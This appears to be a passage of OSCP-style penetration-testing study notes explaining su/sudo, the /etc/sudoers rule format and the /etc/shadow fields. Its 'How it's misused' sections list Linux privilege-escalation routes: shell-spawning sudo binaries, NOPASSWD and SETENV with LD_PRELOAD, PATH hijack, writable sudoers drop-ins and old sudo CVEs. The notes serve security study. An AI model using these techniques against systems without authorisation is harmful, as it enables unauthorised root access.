## How it's misused
- Cracked a user's password? `su - user` to pivot between accounts.
- `sudo -l` shows what you can run; one allowed binary that spawns a shell = root
  (`oscp gtfo <binary> sudo`).
- `sudo -i`/`sudo su -` is the usual "get a full root shell" after any sudo-able foothold.

## Pattern
su = "I know their password, become them"; sudo = "policy lets me, as me, run this as root".
Shell flavour (`-`/`-i`) decides whether you inherit a clean login environment.

entries.title: /etc/sudoers — structure and components
entries.brief: Reading the policy file line by line, and the misconfigs that give root
entries.body:
## Edit with visudo, never a plain editor
`/etc/sudoers` (+ drop-ins in `/etc/sudoers.d/`) is the sudo policy. `visudo` syntax-checks on
save so you can't lock yourself out.

## Anatomy of a rule
    root    ALL=(ALL:ALL) ALL
    user    HOSTS=(RUNAS_USER:RUNAS_GROUP) COMMANDS
- **user / %group** — who it applies to. `%sudo`, `%wheel` are *groups* (every member inherits).
- **HOSTS** — on which hosts (ALL on a single box).
- **(RUNAS_USER:RUNAS_GROUP)** — identities you may become; `(ALL:ALL)` = anyone.
- **COMMANDS** — the exact commands allowed (full paths), or ALL.

    %sudo   ALL=(ALL:ALL) ALL        # anyone in group 'sudo' can run anything as anyone
    bob     ALL=(root) NOPASSWD: /usr/bin/systemctl   # bob runs systemctl as root, no password

## Defaults, tags and aliases
- **Defaults** set behaviour: `env_reset` (scrub env), `secure_path=...` (sudo's own PATH),
  `!targetpw` (ask the caller's password, not the target's), `timestamp_timeout`, `requiretty`.
      Defaults:%wheel !targetpw
- **Tags**: `NOPASSWD:` (no password), `SETENV:` (caller may keep env vars).
- **Aliases**: `User_Alias`, `Cmnd_Alias`, `Runas_Alias` group things for reuse.
- **@includedir /etc/sudoers.d** pulls in drop-in files.

## How it's misused
- A **NOPASSWD** binary you can run as root -> `oscp gtfo <binary> sudo`.
- A rule allowing a **script or wildcard** you can edit/influence -> you control what root runs.
- **env not reset / SETENV** + a binary honouring `LD_PRELOAD`/`PYTHONPATH` -> load your library
  as root.
- **secure_path** missing while a sudo-allowed script calls bare commands -> PATH hijack.
- **Writable** /etc/sudoers.d/* -> add your own rule.
- Old **sudo versions**: pwfeedback (CVE-2019-18634), Baron Samedit (CVE-2021-3156) -> `sudo -V`.

## Pattern
Read each rule as "WHO may become WHOM to run WHAT, and with which Defaults." Any allowed
command that can spawn a shell, read/write files, or inherit your environment is a root path.

entries.title: /etc/shadow — where the real hashes live
entries.brief: The 9 fields, the lock markers (! * !*), the $y$ format, and how it's abused
entries.body:
## Why it exists
/etc/passwd is world-readable, so password hashes were moved to **/etc/shadow**, readable only
by root (and the shadow group). The `x` in passwd field 2 means "look here instead."

## Nine colon-separated fields
    bhuppi:$y$j9T$pqEt...$SvN2...:20752:0:99999:7:::
      1          2                 3    4   5   6 7 8 9

| # | Field | Meaning |
| --- | --- | --- |
| 1 | username | matches /etc/passwd |
| 2 | password | the hash (or a lock marker) |
| 3 | last change | days since 1970-01-01 the password was last set |
| 4 | min | min days before it can be changed again |
| 5 | max | max days the password is valid (99999 = effectively never) |
| 6 | warn | days of warning before expiry |
| 7 | inactive | days after expiry before the account is disabled |
| 8 | expire | account expiry date (days since 1970) |
| 9 | reserved | unused |

## Reading field 2 — the password/lock column
    $y$j9T$salt$hash   a real hash ($y$ = yescrypt, modern Kali default)
    $6$salt$hash       sha512crypt   ($1$ md5, $5$ sha256, $2b$ bcrypt)
    !  or  !!          account LOCKED (password auth disabled) — common for daemons
